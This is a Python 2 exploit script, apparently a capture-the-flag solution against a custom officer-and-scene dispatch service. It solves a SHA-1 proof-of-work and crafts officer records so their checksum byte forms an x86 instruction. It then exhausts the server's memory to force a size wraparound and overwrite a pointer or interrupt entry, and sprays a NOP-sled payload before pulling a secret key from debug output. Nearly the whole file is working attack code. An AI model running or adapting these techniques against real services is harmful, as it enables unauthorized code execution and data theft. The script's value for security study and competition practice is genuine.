import sys, os
import socket
import struct
import binascii
import hashlib

Port = sys.argv[2]

def CalcCRC(Buffer):
	NumVal = 0
	for i in Buffer:
		NumVal += ord(i)
	return NumVal & 0xffff

def CalcDistance(x1, y1):
	x2 = 88
	y2 = 298

	res = 0
	one = 0x40000000
	x = (x2 - x1)
	y = (y2 - y1)
	x = ((x*x)+(y*y)) & 0xFFFFFFFF

	while(one > x):
		one >>= 2

	while (one != 0):
		if (x >= res + one):
			x = x - (res + one)
			res = res +  2 * one
		res >>= 1
		one >>= 2
 
	return res

def CreateOfficer(s, ID, X, Y, Flags):
	Buffer = "\xd0\x07" + struct.pack("<HHHHH", ID, Flags, X, Y, 0)
	Buffer += struct.pack("<H", CalcCRC(Buffer))
	Buffer += "\x00"
	s.send(Buffer)
	return
	
def CreateScene(s, ID, X, Y, Address, Details, OfficerList):
	Buffer = "\xa0\x0f" + struct.pack("<HHHBBHH", ID, X, Y, len(OfficerList), len(Address), len(Details), 0)
	for i in OfficerList:
		Buffer += struct.pack("<H", i)
	Buffer += Address + Details
	Buffer += struct.pack("<H", CalcCRC(Buffer))
	s.send(Buffer)
	return

def SubtractMem(Memory, Size):
	if Memory & 3:
		Memory = (Memory & ~3)

	MemLoc = 0x120000 + (4096*0x200) - Memory
	Memory = Memory - Size
	return Memory

class FakeCon():
	def send(self, data):
		return
	def recv(self, len):
		return "\x00"

def PrintStatus(s, OutMsg):
	MsgType = s.recv(1) + s.recv(1)
	MsgLen = ord(s.recv(1))
	Msg = ""

	while(len(Msg) != MsgLen):
		Data = s.recv(1)
		if len(Data):
			Msg += Data

	#get the checksum
	crc = s.recv(1) + s.recv(1)

	if MsgType == "\x40\x1f":
		MsgType = "Error"
	else:
		MsgType = "OK"

	print "%s: %s %s" % (OutMsg, MsgType, Msg)

def main():
	#if len(sys.argv) != 2:
	#	print "Usage: %s <ip>" % (sys.argv[0])
	#	return

	s = socket.create_connection((sys.argv[1], Port))
	#s = FakeCon()

	#print "Waiting"	
	#raw_input()

	LineData = s.recv(4096)

	LineData = LineData.split(" ")
	HashStart = LineData[10]
	HashLen = int(LineData[13])

	print "Finding a hash starting with %s" % (HashStart)

	HashData = ""
	for i in xrange(0, 2**31):
		HashData = HashStart + struct.pack("<I", i)
		HashData += "\x00"*(HashLen - len(HashData))
		SHAHash = hashlib.sha1(HashData).digest()
		if SHAHash[0:3] == "\x00\x00\x00":
			break

		HashData = ""

	if HashData == "":
		print "Couldn't make a hash"
		return

	print "Hash found: %d" % (i)
	s.send(HashData)

	MemoryLeft = 4096*0x200
	MemoryLeft -= 512
	MemoryLeft -= (16384*2)		#subtract com buffers

	MemoryLeft = SubtractMem(MemoryLeft, 0x6a3e)

	#need to almost fill 3mb of data, also need 257 officers

	#first, create the buffer that has our code to run
	SceneID = 1

	"""
	CreateScene(s, SceneID, 0, 0, "", "B"*1000, [])
	PrintStatus(s, "Shellcode scene")
	MemoryLeft = SubtractMem(MemoryLeft, 26)
	MemoryLeft = SubtractMem(MemoryLeft, 64*1024)
	MemoryLeft = SubtractMem(MemoryLeft, 1000)
	"""

	#create the officers we require
	#x/y/flags
	OfficerData = [
[0x170, 0x0, 0x156, 0xa3],
[0x171, 0x0, 0x143, 0xa3],
[0x172, 0x0, 0x143, 0xa3],
[0x173, 0x0, 0x143, 0xa3],
[0x174, 0x0, 0x153, 0xa3],
[0x175, 0x0, 0x15a, 0xa3],
[0x176, 0x0, 0x15b, 0xa3],
[0x177, 0x0, 0x15f, 0xa3],
[0x270, 0x0, 0x107, 0xa3],
[0x271, 0x0, 0x18d, 0xa3],
[0x272, 0x0, 0x152, 0xa3],
[0x273, 0x0, 0x152, 0xa3],
[0x274, 0x0, 0x144, 0xa3],
[0x275, 0x0, 0x15a, 0xa3],
[0x276, 0x0, 0x150, 0xa3],
[0x277, 0x0, 0x15c, 0xa3],
[0x370, 0x0, 0x158, 0xa3],
[0x371, 0x0, 0x158, 0xa3],
[0x372, 0x0, 0x158, 0xa3],
[0x373, 0x0, 0x158, 0xa3],
[0x374, 0x0, 0x158, 0xa3],
[0x375, 0x0, 0x158, 0xa3],
[0x376, 0x0, 0x158, 0xa3],
[0x377, 0x0, 0x154, 0xa3],
[0x470, 0x0, 0x158, 0xa3],
[0x471, 0x0, 0x10e, 0xa3],
[0x472, 0x0, 0x106, 0xa3],
[0x473, 0x0, 0x144, 0xa3],
[0x474, 0x0, 0x15c, 0xa3],
[0x475, 0x0, 0x10e, 0xa3],
[0x476, 0x7a, 0x0, 0xa3],
[0x477, 0x0, 0x117, 0xa3],
[0x570, 0x0, 0x10e, 0xa3],
[0x571, 0x0, 0x152, 0xa3],
[0x572, 0x0, 0x152, 0xa3],
[0x573, 0x0, 0x152, 0xa3],
[0x574, 0x0, 0x10e, 0xa3],
[0x575, 0x0, 0x15c, 0xa3],
[0x576, 0x0, 0x159, 0xa3],
[0x577, 0x0, 0x159, 0xa3],
[0x670, 0x0, 0x159, 0xa3],
[0x671, 0x0, 0x10e, 0xa3],
[0x672, 0x0, 0x10e, 0xa3],
[0x673, 0x0, 0x152, 0xa3],
[0x674, 0x0, 0x116, 0xa3],
[0x675, 0x0, 0x11f, 0xa3],
[0x676, 0x10f, 0x16, 0x0],
[0x677, 0x0, 0x10e, 0xa3],
[0x770, 0x0, 0x106, 0xa3],
[0x771, 0x0, 0x150, 0xa3],
[0x772, 0x0, 0x1cf, 0xa3],
			]

	#now fill in the rest
	OfficerCount = 0
	MaxOfficerID = 0

	"""
	for i in xrange(0, 8):
		CreateOfficer(s, i, 0, 0, 0)
		PrintStatus(s, "Officer %d" % (i))
		MemoryLeft = SubtractMem(MemoryLeft, 12)
		OfficerCount += 1
	
	#setup int 0x96, flags entry will be useful as x and y is too small
	CreateOfficer(s, 11, 0, 0, 0x96*4+0x10-4)
	PrintStatus(s, "Officer 11")
	MemoryLeft = SubtractMem(MemoryLeft, 12)
	OfficerCount += 1
	"""

	for (oid, x,y,flags) in OfficerData:
		TempData = struct.pack("<HHHHHHH", 1000, oid, x, y, flags, 0, CalcDistance(x, y))
		TempCRC = CalcCRC(TempData)

		#figure out high byte of flags to offset the CRC instruction to be a test, 0xA9
		flags = flags | ((0xA9 - TempCRC) & 0xFF) << 8
		CreateOfficer(s, oid, x, y, flags)
		PrintStatus(s, "Officer %d" % (oid))
		MemoryLeft = SubtractMem(MemoryLeft, 12)
		OfficerCount += 1
		MaxOfficerID = oid

	#now fill in the rest
	for i in xrange(0, 512-OfficerCount):
		CreateOfficer(s, MaxOfficerID+i+1, 0, 0, 0)
		PrintStatus(s, "Officer %d" % (MaxOfficerID+i+1))
		MemoryLeft = SubtractMem(MemoryLeft, 12)

	#create our overwrite officer

	"""
	unsigned int header;
	unsigned int ID;
	unsigned int x;
	unsigned int y;
	unsigned int flags;
	unsigned int padding;
	unsigned int distance;
	unsigned int crc;
	"""

	SegmentID = 0x1497
	ReadPtr = 0
	WritePtr = 0x7a-6	#avoid 0x1c interrupt, system timer tick
	VidSeg = 0

	CreateOfficer(s, SegmentID, ReadPtr, WritePtr, VidSeg)
	PrintStatus(s, "Officer %d" % (SegmentID))
	MemoryLeft = SubtractMem(MemoryLeft, 12)

	for i in xrange(1, 7):
		CreateOfficer(s, SegmentID+i, ReadPtr, WritePtr, VidSeg)
		PrintStatus(s, "Officer %d" % (SegmentID+i))
		MemoryLeft = SubtractMem(MemoryLeft, 12)

	#have a bunch of officers, now create scenes
	#limited to 4096 for the record size so do a size abuse to allocate 64k chunks
	#for address and details
	"""
	for i in xrange(0, 9):
		SceneID += 1
		CreateScene(s, SceneID, 0, 0, "", "", [])
		PrintStatus(s, "2x64k entries")
		MemoryLeft = SubtractMem(MemoryLeft, 26)
		MemoryLeft = SubtractMem(MemoryLeft, 64*1024)
		MemoryLeft = SubtractMem(MemoryLeft, 64*1024)
	"""

	SceneID += 1
	CreateScene(s, SceneID, 0, 0, "a", "", [])
	PrintStatus(s, "64k entry")
	MemoryLeft = SubtractMem(MemoryLeft, 26)
	MemoryLeft = SubtractMem(MemoryLeft, 1)
	MemoryLeft = SubtractMem(MemoryLeft, 64*1024)

	Payload = open("payload","r").read()
	Payload = "\x90" * (4076 - len(Payload)) + Payload

	for i in xrange(0, 13):
		SceneID += 1
		CreateScene(s, SceneID, 0, 0, "a", Payload, [])
		PrintStatus(s, "4k payload entry")
		MemoryLeft = SubtractMem(MemoryLeft, 26)
		MemoryLeft = SubtractMem(MemoryLeft, 1)
		MemoryLeft = SubtractMem(MemoryLeft, len(Payload))

	while(MemoryLeft > (4096 + (1024*64*2))):
		SceneID += 1
		CreateScene(s, SceneID, 0, 0, "", "", [])
		PrintStatus(s, "2x64k entries")
		MemoryLeft = SubtractMem(MemoryLeft, 26)
		MemoryLeft = SubtractMem(MemoryLeft, 64*1024)
		MemoryLeft = SubtractMem(MemoryLeft, 64*1024)

	#create an entry to get rid of 1 64k area
	if(MemoryLeft > (100 + (1024*64))):
		SceneID += 1
		CreateScene(s, SceneID, 0, 0, "a", "", [])
		PrintStatus(s, "64k entry")
		MemoryLeft = SubtractMem(MemoryLeft, 26)
		MemoryLeft = SubtractMem(MemoryLeft, 1)
		MemoryLeft = SubtractMem(MemoryLeft, 64*1024)

	#now start creating 4k entries
	while(MemoryLeft > (4096+26)):
		SceneID += 1
		DetailLen = 4096 - 16 - 255
		CreateScene(s, SceneID, 0, 0, "a"*255, ("b"*(DetailLen-3)) + chr(0) + chr(SceneID % 255) + chr(0), [])
		PrintStatus(s, "4k entry")
		MemoryLeft = SubtractMem(MemoryLeft, 26)
		MemoryLeft = SubtractMem(MemoryLeft, 255)
		MemoryLeft = SubtractMem(MemoryLeft, DetailLen)

	#subtract out a partial message so we can easier calculate
	#how much to give us 1 byte at the end
	MemoryLeft = SubtractMem(MemoryLeft, 26)
	MemoryLeft = SubtractMem(MemoryLeft, 1)

	#calculate detaillen based on 4 byte alignment
	DetailLen = MemoryLeft
	if DetailLen & 3:
		DetailLen = (DetailLen & ~3)
	DetailLen -= (28 + 4)
	
	#create the first entry
	CreateScene(s, SceneID + 1, 0, 0, "A", "B"*DetailLen, [])
	PrintStatus(s, "2nd to last entry")
	MemoryLeft = SubtractMem(MemoryLeft, DetailLen)

	#now create the 2nd entry, a size of 0 gives us 0xffff
	CreateScene(s, SceneID + 2, 0, 0, "AAA", "", [])
	PrintStatus(s, "Last entry (should get out of mem error)")
	MemoryLeft = SubtractMem(MemoryLeft, 26)
	MemoryLeft = SubtractMem(MemoryLeft, 3)
	MemoryLeft = SubtractMem(MemoryLeft, 0)

	#we should now have all of memory exhausted with the descriptor pointing to 0
	#ask for debugging details
	Buffer = "\xfd\xfd\x00\x00"
	Buffer += struct.pack("<H", CalcCRC(Buffer))

	s.send(Buffer)
	#PrintStatus(s, "Generating debug data")

	#go get the key
	s.recv(1)
	s.recv(1)
	key = ""
	while(1):
		data = s.recv(1)
		if data == "\x00":
			break
		key += data

	print key

	key = ""
	while(1):
		data = s.recv(1)
		if data == "\x00":
			break
		key += data
	print key
	return	
main()
